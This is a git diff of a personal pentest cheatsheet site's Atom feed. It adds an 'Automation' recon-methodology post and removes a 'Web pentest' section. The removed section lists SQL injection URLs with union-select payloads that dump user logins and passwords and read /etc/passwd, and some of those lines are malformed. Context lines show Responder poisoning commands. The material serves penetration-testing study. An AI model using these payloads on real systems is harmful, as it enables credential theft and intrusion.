@@ -1,4 +1,57 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en-US"><generator uri="https://jekyllrb.com/" version="3.9.2">Jekyll</generator><link href="http://localhost:4000/atom.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en-US" /><updated>2022-04-25T21:47:22-03:00</updated><id>http://localhost:4000/atom.xml</id><title type="html">Thekaiz3n</title><subtitle>Personal website</subtitle><author><name>Thekaiz3n</name></author><entry><title type="html">Memory, part 1 - How the memory work</title><link href="http://localhost:4000/blog/2022/04/21/memory-part1.html" rel="alternate" type="text/html" title="Memory, part 1 - How the memory work" /><published>2022-04-21T00:00:00-03:00</published><updated>2022-04-21T00:00:00-03:00</updated><id>http://localhost:4000/blog/2022/04/21/memory-part1</id><content type="html" xml:base="http://localhost:4000/blog/2022/04/21/memory-part1.html">&lt;p&gt;This article is in development.&lt;/p&gt;</content><author><name>Thekaiz3n</name></author><category term="blog" /><category term="memory" /><category term="neuroscience" /><summary type="html">This article is in development.</summary></entry><entry><title type="html">Memory, part 2 - Using memory as a super power</title><link href="http://localhost:4000/blog/2022/04/21/memory-part2.html" rel="alternate" type="text/html" title="Memory, part 2 - Using memory as a super power" /><published>2022-04-21T00:00:00-03:00</published><updated>2022-04-21T00:00:00-03:00</updated><id>http://localhost:4000/blog/2022/04/21/memory-part2</id><content type="html" xml:base="http://localhost:4000/blog/2022/04/21/memory-part2.html">&lt;p&gt;This article is in development.&lt;/p&gt;</content><author><name>Thekaiz3n</name></author><category term="blog" /><category term="memory" /><category term="neuroscience" /><summary type="html">This article is in development.</summary></entry><entry><title type="html">Subdomains</title><link href="http://localhost:4000/cheatsheet/2022/04/21/subdomains.html" rel="alternate" type="text/html" title="Subdomains" /><published>2022-04-21T00:00:00-03:00</published><updated>2022-04-21T00:00:00-03:00</updated><id>http://localhost:4000/cheatsheet/2022/04/21/subdomains</id><content type="html" xml:base="http://localhost:4000/cheatsheet/2022/04/21/subdomains.html">&lt;p&gt;Teste&lt;/p&gt;</content><author><name>Thekaiz3n</name></author><category term="cheatsheet" /><category term="pentest" /><category term="methodologies" /><summary type="html">Teste</summary></entry><entry><title type="html">Hashes and basic criptography</title><link href="http://localhost:4000/cheatsheet/2022/01/14/hashes.html" rel="alternate" type="text/html" title="Hashes and basic criptography" /><published>2022-01-14T00:00:00-03:00</published><updated>2022-01-13T00:00:00-03:00</updated><id>http://localhost:4000/cheatsheet/2022/01/14/hashes</id><content type="html" xml:base="http://localhost:4000/cheatsheet/2022/01/14/hashes.html">&lt;h3 id=&quot;examples&quot;&gt;Examples&lt;/h3&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en-US"><generator uri="https://jekyllrb.com/" version="3.9.2">Jekyll</generator><link href="http://localhost:4000/atom.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en-US" /><updated>2022-04-27T22:52:16-03:00</updated><id>http://localhost:4000/atom.xml</id><title type="html">Thekaiz3n</title><subtitle>Personal website</subtitle><author><name>Thekaiz3n</name></author><entry><title type="html">Automation</title><link href="http://localhost:4000/cheatsheet/2022/04/27/automation.html" rel="alternate" type="text/html" title="Automation" /><published>2022-04-27T00:00:00-03:00</published><updated>2022-04-27T00:00:00-03:00</updated><id>http://localhost:4000/cheatsheet/2022/04/27/automation</id><content type="html" xml:base="http://localhost:4000/cheatsheet/2022/04/27/automation.html">&lt;h3 id=&quot;recon-automation&quot;&gt;Recon automation&lt;/h3&gt;
+
+&lt;h3 id=&quot;what-is-the-purpose-of-automation&quot;&gt;What is the purpose of automation?&lt;/h3&gt;
+
+&lt;p&gt;Is use the machines to do &lt;strong&gt;repetitive tasks&lt;/strong&gt;, in a way that humans cannot do. Using the computational power to &lt;strong&gt;leverage&lt;/strong&gt; the desired results. Highlighting two parts:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Repetitive tasks: The objective is not replace humans, and not our knowledge too, but use in a more intelligent way. Where the tasks that we already know how to do, we start to using programming skills to automate these tasks.&lt;/li&gt;
+  &lt;li&gt;Leverage: The computers have a enormous advantage of humans in processing information fast. Knowing this, why not use?&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;automation-principles&quot;&gt;Automation principles&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Patterns: Patterns are follow rigorously.&lt;/li&gt;
+  &lt;li&gt;Control: Every piece of the code, and the execution flow is controlled. And do what is mean to do.&lt;/li&gt;
+  &lt;li&gt;Organization: &lt;strong&gt;Structure&lt;/strong&gt; defined in the patterns are follow by all outputs during the process.&lt;/li&gt;
+  &lt;li&gt;Parallel/Optimization: Computational power is used of the more &lt;strong&gt;intelligent&lt;/strong&gt; way possible.&lt;/li&gt;
+  &lt;li&gt;Database: Data is structured based in one idea: &lt;strong&gt;Correlation&lt;/strong&gt;.&lt;/li&gt;
+  &lt;li&gt;Result: The automation that don’t create &lt;strong&gt;results&lt;/strong&gt;, is useless.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;ideal-structure&quot;&gt;Ideal structure&lt;/h3&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Database: The database has to be flexible and allow correlation. Suggestion:
+    &lt;ul&gt;
+      &lt;li&gt;NoSQL databse&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Code structure: Has to be of easy an fast deploy: Suggestions:
+    &lt;ul&gt;
+      &lt;li&gt;VPS or Cloud services: This way the hardware are in separable concerns and allow easy upgrades.&lt;/li&gt;
+      &lt;li&gt;Docker: Easy and fast deploy.&lt;/li&gt;
+      &lt;li&gt;Auto config: Scripts to automatic config the machines, with all that need to work.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Notifications: The process must have notifications to the owner.
+    &lt;ul&gt;
+      &lt;li&gt;Telegram: Easy and fast.&lt;/li&gt;
+      &lt;li&gt;Discord: More organization.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Tools outputs: All the scripts and tools must have the same output structure.
+    &lt;ul&gt;
+      &lt;li&gt;Treatment: All output must have data processing.&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;Continuous integration: Allow that the automation iterate in the data, to search for new data.&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h3 id=&quot;process&quot;&gt;Process&lt;/h3&gt;
+
+&lt;p&gt;&lt;img src=&quot;/assets/images/cheatsheet/automation.jpg&quot; alt=&quot;center-aligned-image&quot; class=&quot;align-center&quot; /&gt;&lt;/p&gt;</content><author><name>Thekaiz3n</name></author><category term="cheatsheet" /><category term="pentest" /><category term="automation" /><category term="recon" /><summary type="html">A explanation e suggestion of automation flow</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/cheatsheet/automation2.jpg" /><media:content medium="image" url="http://localhost:4000/assets/images/cheatsheet/automation2.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Memory, part 1 - How the memory work</title><link href="http://localhost:4000/blog/2022/04/21/memory-part1.html" rel="alternate" type="text/html" title="Memory, part 1 - How the memory work" /><published>2022-04-21T00:00:00-03:00</published><updated>2022-04-21T00:00:00-03:00</updated><id>http://localhost:4000/blog/2022/04/21/memory-part1</id><content type="html" xml:base="http://localhost:4000/blog/2022/04/21/memory-part1.html">&lt;p&gt;This article is in development.&lt;/p&gt;</content><author><name>Thekaiz3n</name></author><category term="blog" /><category term="memory" /><category term="neuroscience" /><summary type="html">This article is in development.</summary></entry><entry><title type="html">Memory, part 2 - Using memory as a super power</title><link href="http://localhost:4000/blog/2022/04/21/memory-part2.html" rel="alternate" type="text/html" title="Memory, part 2 - Using memory as a super power" /><published>2022-04-21T00:00:00-03:00</published><updated>2022-04-21T00:00:00-03:00</updated><id>http://localhost:4000/blog/2022/04/21/memory-part2</id><content type="html" xml:base="http://localhost:4000/blog/2022/04/21/memory-part2.html">&lt;p&gt;This article is in development.&lt;/p&gt;</content><author><name>Thekaiz3n</name></author><category term="blog" /><category term="memory" /><category term="neuroscience" /><summary type="html">This article is in development.</summary></entry><entry><title type="html">Subdomains</title><link href="http://localhost:4000/cheatsheet/2022/04/21/subdomains.html" rel="alternate" type="text/html" title="Subdomains" /><published>2022-04-21T00:00:00-03:00</published><updated>2022-04-21T00:00:00-03:00</updated><id>http://localhost:4000/cheatsheet/2022/04/21/subdomains</id><content type="html" xml:base="http://localhost:4000/cheatsheet/2022/04/21/subdomains.html">&lt;p&gt;Teste&lt;/p&gt;</content><author><name>Thekaiz3n</name></author><category term="cheatsheet" /><category term="pentest" /><category term="methodologies" /><summary type="html">Teste</summary></entry><entry><title type="html">Hashes and basic criptography</title><link href="http://localhost:4000/cheatsheet/2022/01/14/hashes.html" rel="alternate" type="text/html" title="Hashes and basic criptography" /><published>2022-01-14T00:00:00-03:00</published><updated>2022-01-13T00:00:00-03:00</updated><id>http://localhost:4000/cheatsheet/2022/01/14/hashes</id><content type="html" xml:base="http://localhost:4000/cheatsheet/2022/01/14/hashes.html">&lt;h3 id=&quot;examples&quot;&gt;Examples&lt;/h3&gt;
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;teste&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;md5sum
 &lt;/span&gt;3b16dc694c38d04f7d7451cc37d3c654  -
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
@@ -521,7 +574,7 @@ egrep &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;s2&q
       &lt;li&gt;&lt;a href=&quot;/cheatsheet/2022/01/13/enumeration.html&quot;&gt;Enumeration&lt;/a&gt;&lt;/li&gt;
       &lt;li&gt;&lt;a href=&quot;/cheatsheet/2022/01/12/infrastructure.html&quot;&gt;Infrastructure&lt;/a&gt;&lt;/li&gt;
       &lt;li&gt;Vulnerabilities&lt;/li&gt;
-      &lt;li&gt;Automation&lt;/li&gt;
+      &lt;li&gt;&lt;a href=&quot;/cheatsheet/2022/04/27/automation.html&quot;&gt;Automation&lt;/a&gt;&lt;/li&gt;
     &lt;/ul&gt;
   &lt;/li&gt;
   &lt;li&gt;&lt;a href=&quot;/cheatsheet/2022/01/12/osint.html&quot;&gt;Osint&lt;/a&gt;&lt;/li&gt;
@@ -758,201 +811,4 @@ nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&q
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;vim /etc/responder/Responder.conf &lt;span class=&quot;c&quot;&gt;# Configure the ips field RespondTo&lt;/span&gt;
 
 responder &lt;span class=&quot;nt&quot;&gt;-I&lt;/span&gt; eth0 &lt;span class=&quot;nt&quot;&gt;-Prv&lt;/span&gt; &lt;span class=&quot;c&quot;&gt;# Will list to all&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;</content><author><name>Thekaiz3n</name></author><category term="cheatsheet" /><category term="pentest" /><category term="post-exploitation" /><category term="exploitation" /><summary type="html">This is a guide for post exploitation</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/cheatsheet/post-exploitation.jpeg" /><media:content medium="image" url="http://localhost:4000/assets/images/cheatsheet/post-exploitation.jpeg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Web pentest</title><link href="http://localhost:4000/cheatsheet/2022/01/13/web-pentesting.html" rel="alternate" type="text/html" title="Web pentest" /><published>2022-01-13T00:00:00-03:00</published><updated>2022-01-13T00:00:00-03:00</updated><id>http://localhost:4000/cheatsheet/2022/01/13/web-pentesting</id><content type="html" xml:base="http://localhost:4000/cheatsheet/2022/01/13/web-pentesting.html">&lt;h1 id=&quot;web-hacking&quot;&gt;Web hacking&lt;/h1&gt;
-&lt;h2 id=&quot;attack-vectors&quot;&gt;Attack vectors&lt;/h2&gt;
-&lt;ul&gt;
-  &lt;li&gt;Parameters&lt;/li&gt;
-  &lt;li&gt;Search inputs&lt;/li&gt;
-  &lt;li&gt;Login/athentication inputs&lt;/li&gt;
-  &lt;li&gt;Fields/register inputs&lt;/li&gt;
-  &lt;li&gt;Redirects&lt;/li&gt;
-  &lt;li&gt;GET e POST parameters&lt;/li&gt;
-  &lt;li&gt;Download&lt;/li&gt;
-  &lt;li&gt;Upload&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h2 id=&quot;sql-injection&quot;&gt;SQL Injection.&lt;/h2&gt;
-&lt;p&gt;Use sql commands that are not sanitized do retrieve database informations:
-Links:&lt;/p&gt;
-&lt;ul&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/&quot;&gt;Cheat sheet&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://portswigger.net/web-security/sql-injection/cheat-sheet&quot;&gt;Portswigger&lt;/a&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://www.w3schools.com/Sql/sql_comments.asp&quot;&gt;w3schools&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;Sql sintax examples(mysql):&lt;/p&gt;
-&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;user&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;--Show user&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;create&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;database&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;  
-&lt;span class=&quot;n&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;test&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;show&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tables&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;create&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;table&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;primary&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;key&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;auto_increment&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;login&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;varchar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passwords&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;vasrchar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;20&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;describe&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;insert&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;into&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;values&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;1&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;admin&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;admin&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;where&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;concat&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;login&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;:&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;passwords&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;users&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- CONCATENATE selects.&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;versions&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- Show database version&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;load&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;/var/www/html/index.html&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- Load a file.&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sleep&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;-- Sleep 5 sec until return.&lt;/span&gt;
-&lt;span class=&quot;k&quot;&gt;select&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;substring&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;test&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;mysql&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;--System database that has informations about users,...&lt;/span&gt;
-&lt;span class=&quot;n&quot;&gt;use&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;information_schema&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;--System database, has informations about created databases, tables, columns.&lt;/span&gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;h3 id=&quot;sql-information-schema&quot;&gt;SQL Information Schema&lt;/h3&gt;
-&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;172&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;turismo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;agencias&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loja&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;union select 1,2,table_name,4,5 from information_schema.tables&apos;&lt;/span&gt; 
-&lt;span class=&quot;mi&quot;&gt;172&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;turismo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;agencias&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loja&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;union select 1,2,table_name,4,5 where table_schema =&quot;dbname&quot;%23&apos;&lt;/span&gt; 
-&lt;span class=&quot;mi&quot;&gt;172&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;turismo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;agencias&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loja&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;union select 1,2,column_name,4,5 where table_schema =&quot;dbname&quot; and table_name=&quot;dbusers&quot;%23&apos;&lt;/span&gt; 
-&lt;span class=&quot;mi&quot;&gt;172&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;turismo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;agencias&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loja&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;union select 1,2,nome,login,senha from dbusers %23&apos;&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;
-&lt;span class=&quot;mi&quot;&gt;172&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;turismo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;agencias&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loja&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;union select 1,2,concat(&apos;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;id&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;,id,&apos;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Login&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;,login,&apos;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;pass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;,password)4,5 from mrudbuserssers %23&apos;&lt;/span&gt; 
-&lt;span class=&quot;mi&quot;&gt;172&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;10&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;turismo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;agencias&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;php&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;loja&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&apos;union select 1,2,3,4,load_file(&quot;/etc/passwd&quot;)%23&apos;&lt;/span&gt; 
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
